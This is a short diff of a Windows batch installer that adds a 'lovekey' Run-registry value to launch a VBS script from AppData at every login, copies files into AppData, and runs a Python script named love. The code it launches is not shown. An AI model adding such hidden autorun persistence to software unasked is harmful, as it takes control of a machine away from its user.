@@ -5,9 +5,9 @@ DEL src\python_installer.exe
 :pythonInstalled
 REG query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey
 IF %errorlevel%==0 GOTO keyInstalled
-REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey /t REG_SZ /d %appdata%\file\launch.vbs
+REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v lovekey /t REG_EXPAND_SZ /d "%SystemRoot%\System32\WScript.exe C:\Users\Organ\AppData\Roaming\file\launch.vbs"
 :keyInstalled
 IF EXIST %appdata%\file GOTO fileCopied
 XCOPY src\file %appdata%\file /i
 :fileCopied
-"C:\Python391\python.exe" "src\file\love.pyw"
+"C:\Python391\python.exe" "src\file\love.py"
